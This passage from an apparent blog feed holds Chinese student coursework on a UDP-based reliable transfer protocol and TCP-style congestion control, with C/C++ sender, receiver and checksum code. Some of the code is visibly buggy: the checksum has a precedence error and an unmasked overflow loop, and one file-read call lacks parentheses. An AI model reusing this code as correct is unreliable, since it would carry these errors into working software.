    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="3-3：拥塞控制算法"><a href="#3-3：拥塞控制算法" class="headerlink" title="3-3：拥塞控制算法"></a>3-3：拥塞控制算法</h1><p><strong>在任务3-2的基础上，选择实现一种拥塞控制算法，也可以是改进的算法，完成给定测试文件的传输。</strong></p>
<p>*注：由于是基于任务3-2上做的拥塞控制算法改进，只修改了窗口大小，故报文格式等内容不在重复。</p>
<p><font color="red"><strong>注：快速重传只重传收到冗余ack的对应一条报文，不是重传base到sendnextseq之间的所有内容</strong></font></p>
<h2 id="拥塞控制算法"><a href="#拥塞控制算法" class="headerlink" title="拥塞控制算法"></a>拥塞控制算法</h2><h3 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-3/image-20201225212734579.png"  alt="image-20201225212734579"></p>
<p>初始状态：<strong>慢启动</strong></p>
<ul>
<li>窗口大小为1，阈值32</li>
<li>如果收到新的ACK，窗口大小＋1，效果为<strong>单位时间内呈指数增长</strong></li>
<li>如果收到<strong>冗余ACK</strong>，标记，若<strong>连续</strong>收到<strong>三次冗余ACK</strong><ul>
<li>启动<strong>快速重传</strong></li>
<li>阈值设为窗口大小的一半</li>
<li>窗口大小设置为阈值+3</li>
<li>进入<strong>快速恢复阶段</strong></li>
</ul>
</li>
<li>当<strong>窗口大小&gt;=阈值</strong>时，进入拥塞避免阶段</li>
<li>若<strong>超时</strong>没有收到新的ACK<ul>
<li>阈值=窗口大小/2</li>
<li>窗口大小=1</li>
<li>重新进入<strong>慢启动阶段</strong></li>
</ul>
</li>
</ul>
<p><strong>拥塞避免</strong></p>
<ul>
<li>每收到一个新的ACK，窗口大小增长为<strong>1/窗口大小</strong>，即<strong>单位时间呈线性增长</strong></li>
<li>如果收到<strong>冗余ACK</strong>，标记，若<strong>连续</strong>收到<strong>三次冗余ACK</strong><ul>
<li>启动<strong>快速重传</strong></li>
<li>阈值设为窗口大小的一半</li>
<li>窗口大小设置为阈值+3</li>
<li>进入<strong>快速恢复</strong></li>
</ul>
</li>
<li>若<strong>超时</strong>没有收到新的ACK<ul>
<li>阈值=窗口大小/2</li>
<li>窗口大小=1</li>
<li>重新进入<strong>慢启动阶段</strong></li>
</ul>
</li>
</ul>
<p><strong>快速恢复</strong></p>
<ul>
<li>每收到一个冗余的ACK，窗口大小+1，直到窗口大小&gt;=阈值，进入<strong>拥塞避免</strong>阶段</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">recvhandler</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	printwindow();</span><br><span class="line">	<span class="keyword">int</span> i = (<span class="keyword">int</span>)(LPVOID)lparam;</span><br><span class="line">	<span class="comment">//cout &lt;&lt; "接收" &lt;&lt; i &lt;&lt; endl;</span></span><br><span class="line">	<span class="keyword">clock_t</span> finalovertime;</span><br><span class="line">	<span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (base &lt; buffersize)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (sendnextseq &gt; base + N || sendnextseq == base)<span class="comment">//窗口已满（对方还没有发送ack）或者窗口为空</span></span><br><span class="line">			Sleep(<span class="number">2</span>);</span><br><span class="line">		message a;</span><br><span class="line">		simplerecv(a);</span><br><span class="line">		<span class="keyword">if</span> (a.get_ack())<span class="comment">//收到确认消息且序号正确</span></span><br><span class="line">		&#123;</span><br><span class="line">			clockstart = clock();<span class="comment">//重置计时器</span></span><br><span class="line">			<span class="keyword">if</span> (a.ackseq &gt;= base)<span class="comment">//收到正确的消息序号</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (constatus == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					N += a.ackseq - base + <span class="number">1</span>;<span class="comment">//累积确认</span></span><br><span class="line">					<span class="keyword">if</span> (N &gt;= ssthresh)</span><br><span class="line">						constatus = <span class="number">1</span>;<span class="comment">//拥塞避免</span></span><br><span class="line">					</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (constatus == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					N += (a.ackseq - base + <span class="number">1</span>) / N;<span class="comment">//线性增长</span></span><br><span class="line">				&#125;</span><br><span class="line">				printwindow();</span><br><span class="line">				base = a.ackseq + <span class="number">1</span>;</span><br><span class="line">				overtime = <span class="number">0</span>;</span><br><span class="line">				t = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (a.ackseq &lt;= base<span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				t++;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; t &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				printwindow();</span><br><span class="line">				<span class="keyword">if</span> (constatus == <span class="number">2</span>) &#123;<span class="comment">//快速恢复</span></span><br><span class="line">					N += <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span> (N &gt;= ssthresh) constatus = <span class="number">1</span>;<span class="comment">//进入拥塞避免阶段</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (t == <span class="number">3</span>)<span class="comment">//三个冗余ack</span></span><br><span class="line">				&#123;</span><br><span class="line">					constatus = <span class="number">2</span>; <span class="comment">//快速重传</span></span><br><span class="line">					overtime = <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		clockend = clock();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"exitpoint2"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">sendhandler</span><span class="params">(LPVOID lparam)</span><span class="comment">//发线程</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">clock_t</span> s = clock();</span><br><span class="line">	<span class="keyword">while</span> (base &lt; buffersize)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> i = (<span class="keyword">int</span>)(LPVOID)lparam;</span><br><span class="line">		<span class="keyword">if</span> (!overtime)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> temp = base;</span><br><span class="line">			<span class="keyword">if</span> (base + N == sendnextseq)</span><br><span class="line">				Sleep(<span class="number">40</span>);</span><br><span class="line">			<span class="keyword">for</span> (; sendnextseq &lt; base + N &amp;&amp; sendnextseq &lt; buffersize; sendnextseq++)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = <span class="number">0</span>;<span class="comment">//正常发送</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!overtime)</span><br><span class="line">				&#123;</span><br><span class="line">					simplesend(msgsend[sendnextseq]);</span><br><span class="line">					s = clock();</span><br><span class="line">					<span class="comment">//Sleep(20);</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				simplesend(msgsend[sendnextseq]);</span><br><span class="line">				<span class="keyword">if</span> (temp == base)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">clock_t</span> e = clock();</span><br><span class="line">					<span class="keyword">if</span> ((e - s) / CLOCKS_PER_SEC &gt;= WAIT_TIME)<span class="comment">//超时重发</span></span><br><span class="line">					&#123;</span><br><span class="line">						overtime = <span class="number">1</span>;</span><br><span class="line">						sendnextseq++;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (overtime == <span class="number">1</span>)<span class="comment">//重新发送</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (constatus == <span class="number">1</span> || constatus == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ssthresh = N / <span class="number">2</span>;</span><br><span class="line">				N = <span class="number">1</span>;</span><br><span class="line">				constatus = <span class="number">0</span>;<span class="comment">//重新进入慢启动阶段</span></span><br><span class="line">				printwindow();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (constatus == <span class="number">2</span>)</span><br><span class="line">			&#123;<span class="comment">//快速重传</span></span><br><span class="line">				ssthresh = N / <span class="number">2</span>;</span><br><span class="line">				N = ssthresh + <span class="number">3</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">				Sleep(<span class="number">10</span>);<span class="comment">//减少重传次数</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = base; i &lt; sendnextseq; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//重新发送</span></span><br><span class="line">				<span class="keyword">if</span> (overtime)</span><br><span class="line">					simplesend(msgsend[i]); </span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">				flag++;</span><br><span class="line">			&#125;</span><br><span class="line">			overtime = <span class="number">0</span>;<span class="comment">//重传标识归0</span></span><br><span class="line">			s = clock();<span class="comment">//重置计时器</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">clock_t</span> e = clock();</span><br><span class="line">		<span class="keyword">if</span> ((e - s) / CLOCKS_PER_SEC &gt;= WAIT_TIME)<span class="comment">//超时重发</span></span><br><span class="line">			overtime = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"exitpoint1"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>大三上学期课程内容</tag>
        <tag>socket</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络作业3-2 基于UDP服务设计可靠传输协议并编程实现</title>
    <url>/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="实验3：基于UDP服务设计可靠传输协议并编程实现"><a href="#实验3：基于UDP服务设计可靠传输协议并编程实现" class="headerlink" title="实验3：基于UDP服务设计可靠传输协议并编程实现"></a>实验3：基于UDP服务设计可靠传输协议并编程实现</h1><h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><p>任务3-2：在任务3-1的基础上，将停等机制改成基于滑动窗口的流量控制机制，采用固定窗口大小，支持累积确认，完成给定测试文件的传输。</p>
<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213165003849.png"  alt="image-20201213165003849" style="zoom: 25%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//以下内容按1Byte对齐，如果没有这条指令会以4Byte对齐，例如u_short类型会用2B存信息，2B补零，方便后续转换成char*格式</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>//报文格式</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//ACK=0x01, SYN=0x02, FIN=0x04,EXIST 0x10,startfile 0x20,endfile 0x40</span></span><br><span class="line">	<span class="keyword">int</span> flag;<span class="comment">//标志位</span></span><br><span class="line">	DWORD SendIP, RecvIP;<span class="comment">//发送端IP和接收端IP</span></span><br><span class="line">    u_short SendPort, RecvPort;<span class="comment">//发送端端口和接收端端口</span></span><br><span class="line">	<span class="keyword">int</span> msgseq;<span class="comment">//消息序号</span></span><br><span class="line">	<span class="keyword">int</span> ackseq;<span class="comment">//恢复ack时确认对方的消息的序号</span></span><br><span class="line">	<span class="keyword">int</span> index;<span class="comment">//用于描述文件大小，需要多少条消息才能传输完成（1条index=0,2条index=1，以此类推）</span></span><br><span class="line">	<span class="keyword">int</span> filelength;<span class="comment">//本次实验使用固定报文长度，故只需要告诉对方有多少条和最后一条除首部信息外有多少位有效信息</span></span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">fill</span>;<span class="comment">//补零成为16bit的倍数，便于计算校验和</span></span><br><span class="line">	u_short checksum;<span class="comment">//校验和</span></span><br><span class="line">	<span class="keyword">char</span> msg[BUF_SIZE];<span class="comment">//报文的具体内容，本次实验简化为固定长度</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()<span class="comment">//恢复4Byte编址格式</span></span></span><br></pre></td></tr></table></figure>

<h2 id="滑动窗口与累积确认"><a href="#滑动窗口与累积确认" class="headerlink" title="滑动窗口与累积确认"></a>滑动窗口与累积确认</h2><p>代码见附录-消息处理流程</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213183125281.png"  alt="image-20201213183125281" style="zoom:50%;">

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><strong>client端：</strong></p>
<ul>
<li><p><strong>msgsend：</strong>用于存储发送的消息，一维数组</p>
</li>
<li><p><strong>base：</strong>窗口底部，代表消息<strong>msgsend[0:base-1]</strong>部分已经全部传输完毕，且<strong>收到了对方返回的对应ACK</strong>，<strong>msgsend[base]</strong>是下面要<strong>接收对应ACK</strong>的消息</p>
</li>
<li><p><strong>N：</strong>窗口大小，<strong>msgsend[base:base+N-1]</strong>是当前允许发送的消息，本次实验取N=10</p>
</li>
<li><p><strong>sendnextseq：</strong>下一条要发送的消息</p>
</li>
</ul>
<p><strong>server端：</strong></p>
<ul>
<li><p><strong>msgrecv：</strong>用于存储接收的消息，一维数组</p>
</li>
<li><p><strong>recvnextseq：</strong>下一条要接收并<strong>返回ACK</strong>的消息，编号<strong>小于recvnextseq</strong>的消息已经全部<strong>返回ACK</strong></p>
</li>
</ul>
<h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p><strong>server端：</strong></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213182752647.png"  alt="image-20201213182752647" style="zoom: 40%;">

<ul>
<li>按顺序接收对方发来的消息<strong>msgseq（收到的消息序号）==recvnextseq</strong>，且<strong>校验和正确</strong>，<strong>返回对应的ACK（ackseq=msgseq）</strong></li>
<li>如果发生消息<strong>失序</strong>，即<strong>msgseq!=recvnextseq</strong>，或<strong>校验和错误</strong>，则丢弃消息，<strong><font color="red">返回第recvnextseq-1条消息的ACK</font></strong></li>
</ul>
<p><strong>client端：</strong></p>
<p><strong>注：</strong></p>
<ul>
<li><p><strong>为了实现消息的同时收发，提高效率，使用多线程编程</strong></p>
</li>
<li><p><strong>为了避免线程间信息交互带来的问题，计时器部分全部在发送线程完成</strong></p>
</li>
</ul>
<p>靠client端的<strong>接收线程</strong>完成</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213182855094.png"  alt="image-20201213182855094" style="zoom:50%;">

<ul>
<li>接收对方返回的ACK，其中的<strong>ackseq</strong>代表<strong>msgsend[0:ackseq]</strong>(包含ackseq)已经全部被对方收到且<strong>确认</strong><ul>
<li>如果<strong>base&lt;ackseq+1</strong>，则说明server端对新消息进行了确认，滑动窗口，使<strong>base=ackseq+1</strong>，并<strong>重置计时器</strong></li>
<li>如果<strong>base&gt;=ackseq</strong>，则说明server端或client端发送的消息发生了失序，由于<strong>msgsend[0:base-1]已经被确认</strong>，所以可以不对该项情况进行处理，直接跳过等待接收下一条消息即可</li>
</ul>
</li>
</ul>
<p><strong>发送线程</strong></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213183055317.png"  alt="image-20201213183055317" style="zoom:50%;">

<ul>
<li>滑动窗口机制需要在发送前预先将窗口内的消息存储至内存中</li>
<li>如果窗口未满且当前状态不需要重传，则继续发送信息，发送完毕后<strong>重置计时器</strong></li>
<li>如果超时未收到对方发来的所需的ACK，则按<strong>超时处理</strong>，重新发送窗口中<strong>已发送但是未确认的消息</strong></li>
<li>如果出现重发一定次数依然无法收到所需ACK的情况，进行<strong>断网处理</strong></li>
<li>当所有消息都被对方确认即<strong>base==buffersize</strong>（发送缓冲区），结束当前发送线程</li>
</ul>
<h2 id="交互流程"><a href="#交互流程" class="headerlink" title="交互流程"></a>交互流程</h2><p>由于采用的是<strong>滑动窗口机制</strong>，在client端在发送消息之前，需要<strong>将要发送的消息存储输入msgsend</strong>中，如果传输的消息过大，应采用<strong>分片</strong>处理，即分多次存入数组，为了<strong>减小重传代价</strong>，每片都应添加<strong>SYN</strong>和<strong>FIN</strong>消息。这里由于需要发送的文件较小，略过分片功能</p>
<p><strong>注：下面所说的”client端发送“是指将消息添加至发送缓冲区</strong></p>
<p><strong>client端</strong>：（采用滑动窗口机制，没有明确的状态设置）</p>
<ul>
<li><p><strong>建立连接</strong>：发送一条带有标识<strong>SYN</strong>的消息，表示希望建立连接</p>
</li>
<li><p><strong>发送文件</strong>：</p>
</li>
<li><p>消息1，文件开始标识位<strong>SF=1</strong>，<strong>index=发送文件需要的消息条数-1</strong>，<strong>filelength=最后一条消息msg成员的有效位数</strong>。</p>
<ul>
<li>发送文件，每条msg的有效长度固定为1024，最后一条<strong>EF=1</strong></li>
</ul>
</li>
<li><p><strong>断开连接</strong>：发送一条标识为<strong>FIN</strong>的消息</p>
</li>
</ul>
<p><strong>server端</strong>：</p>
<p>​    - 初始：状态0</p>
<ul>
<li><p><strong>建立连接</strong>：收到一条<strong>SYN</strong>，回复对应的<strong>ACK</strong>，连接建立成功，进入状态1</p>
</li>
<li><p><strong>发送文件</strong>：收到包含<strong>SF</strong>、<strong>index</strong>、<strong>filelength</strong>的消息，开始接收文件，进入状态2。对于每条消息都返回一条<strong>ACK</strong> 。当收到包含标志位<strong>EF</strong>的消息，检查<strong>index与收到文件消息的条数</strong>，若一致，则返回<strong>ACK</strong>，退回状态1</p>
</li>
<li><p><strong>断开连接</strong>：收到包含标识为<strong>FIN</strong>的消息，返回<strong>ACK</strong>，进入状态0</p>
</li>
</ul>
<p><strong>注：</strong>当server端和client端在一定时间内没有接收或<strong>不能接收到对方的消息</strong>，需要做<strong>断网处理</strong>，即自动退回到状态0</p>
<h2 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h2><p>由于只需实现文件的单向传输，所以只需两次握手即可建立连接</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213095738718.png"  alt="image-20201213095738718" style="zoom:50%;">



  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buildconnectionCli</span><span class="params">()</span><span class="comment">//客户端，连接发起方</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    message a;</span><br><span class="line">    a.set_syn();<span class="comment">//SYN</span></span><br><span class="line">    a.msgseq = buffersize;</span><br><span class="line">    message::copy(msgsend[buffersize++], a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="连接断开"><a href="#连接断开" class="headerlink" title="连接断开"></a>连接断开</h2><p>与连接建立类似，由于是单向传输，两次挥手即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">byecli</span><span class="params">()</span><span class="comment">//server端只需要回复ACK，功能比较简单没有封装成函数，处理流程详见附录</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	message a;</span><br><span class="line">	a.set_fin();<span class="comment">//FIN</span></span><br><span class="line">	a.msgseq = buffersize;</span><br><span class="line">	message::copy(msgsend[buffersize++], a);<span class="comment">//添加至发送消息队列中</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="差错重传"><a href="#差错重传" class="headerlink" title="差错重传"></a>差错重传</h2><p>使用<strong>校验和</strong>方式检测是否出现差错，校验和计算方式与rdt3.0类似，只是根据本次实验设计的报文格式进行了简单修改。校验和计算包括0-255bit。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213165032779.png"  alt="image-20201213165032779" style="zoom:25%;">

<p>计算方法如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message::setchecksum</span><span class="params">()</span><span class="comment">//发送方计算校验和并填入响应位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	u_char* temp = (u_char*)<span class="keyword">this</span>;<span class="comment">//以1B为单位进行处理，注意设置为unsigned类型，否则在后续相加时会按照默认最高位是正负号，影响计算结果</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)<span class="comment">//取报文的前16组，每组16bit，共计32字节256bit</span></span><br><span class="line">	&#123;</span><br><span class="line">		sum += temp[<span class="number">2</span> * i] &lt;&lt; <span class="number">8</span> + temp[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">while</span> (sum &gt;= <span class="number">0x10000</span>)</span><br><span class="line">		&#123;<span class="comment">//溢出</span></span><br><span class="line">			<span class="keyword">int</span> t = sum &gt;&gt; <span class="number">16</span>;<span class="comment">//将最高位回滚添加至最低位</span></span><br><span class="line">			sum += t;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">this</span>-&gt;checksum = ~(u_short)sum;<span class="comment">//按位取反，方便校验计算</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">message::checkchecksum</span><span class="params">()</span><span class="comment">//接收方对校验和进行检验</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	u_char* temp = (u_char*)<span class="keyword">this</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += temp[<span class="number">2</span> * i] &lt;&lt; <span class="number">8</span> + temp[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">while</span> (sum &gt;= <span class="number">0x10000</span>)</span><br><span class="line">		&#123;<span class="comment">//溢出</span></span><br><span class="line">			<span class="keyword">int</span> t = sum &gt;&gt; <span class="number">16</span>;<span class="comment">//计算方法与设置校验和相同</span></span><br><span class="line">			sum += t;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//把计算出来的校验和和报文中该字段的值相加，如果等于0xffff，则校验成功</span></span><br><span class="line">	<span class="keyword">if</span> (checksum + (u_short)sum == <span class="number">65535</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当server端检测到校验和错误时，<strong>不发送NAK</strong>，只<strong>返回对当前已经确认的消息序号</strong>，等待client端<strong>超时重新发送</strong>。</p>
<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-2/image-20201213202840946.png"  alt="image-20201213202840946" style="zoom:50%;">

<p><strong>client端：</strong></p>
<ul>
<li>读入文件至内存中</li>
<li>文件起始消息<strong>SF置1</strong>，将发送文件所需要的<strong>消息条数index</strong>和<strong>最后一条消息msg段有效位数</strong>填入报头中<strong>index</strong>和<strong>filelength</strong>相应位置，<strong>msg成员填入文件名</strong></li>
<li>将内存中的消息复制到message类对象的msg段</li>
<li>最后一条消息<strong>EF置1</strong>，告知对方文件发送结束</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读入文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readfile</span><span class="params">(<span class="keyword">char</span>* name,<span class="keyword">char</span> content[<span class="number">10000</span>][<span class="number">1024</span>],<span class="keyword">int</span> &amp;length,  <span class="keyword">int</span>  &amp; index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	index = <span class="number">0</span>;</span><br><span class="line">	length = <span class="number">0</span>;</span><br><span class="line">	<span class="function">ifstream <span class="title">in</span><span class="params">(name, ifstream::binary)</span></span>;<span class="comment">//以二进制方式读入文件</span></span><br><span class="line">	<span class="keyword">if</span> (!in)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"文件无效"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> t = in.<span class="built_in">get</span>();</span><br><span class="line">	<span class="keyword">while</span> (in)<span class="comment">//如果读入失败（读入完成）则退出</span></span><br><span class="line">	&#123;<span class="comment">//将文件内容存入content数组中</span></span><br><span class="line">		content[index][length % <span class="number">1024</span>] = t;<span class="comment">//每行1024个字节，对应msg成员长度为1024</span></span><br><span class="line">		length++;</span><br><span class="line">		<span class="keyword">if</span> (length % <span class="number">1024</span> == <span class="number">0</span>)<span class="comment">//上一条缓冲区</span></span><br><span class="line">		&#123;</span><br><span class="line">			index++; length = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		t = in.<span class="built_in">get</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	in.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sendfile</span><span class="params">(<span class="keyword">char</span>* name)</span><span class="comment">//发送文件</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//开始发送文件消息</span></span><br><span class="line">	message a;</span><br><span class="line">	a.set_startfile();<span class="comment">//设置SF标识</span></span><br><span class="line">	<span class="keyword">int</span> index = <span class="number">0</span>; <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	readfile(name, content, length, index);<span class="comment">//读入文件，复制到content二维数组</span></span><br><span class="line">	a.index = index;<span class="comment">//文件大小相关信息</span></span><br><span class="line">	a.filelength = length;</span><br><span class="line">	<span class="built_in">strcpy</span>(a.msg, name);<span class="comment">//文件基本信息</span></span><br><span class="line">	a.msgseq = buffersize;<span class="comment">//设置消息序号</span></span><br><span class="line">	message::copy(msgsend[buffersize++], a);<span class="comment">//添加到发送消息队列中</span></span><br><span class="line">	<span class="keyword">if</span> (index==<span class="number">0</span> &amp;&amp; length == <span class="number">0</span>)<span class="comment">//读入0个字节</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//文件读入失败</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//文件具体内容</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1024</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			msgsend[buffersize].msg[j] = content[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		msgsend[buffersize].msgseq = buffersize;</span><br><span class="line">		buffersize++;<span class="comment">//发送缓冲区大小增加</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &lt;= index; i++)</span><br><span class="line">	&#123;<span class="comment">//添加文件的最后一条消息</span></span><br><span class="line">		message b;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			b.msg[j] = content[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		b.msgseq = 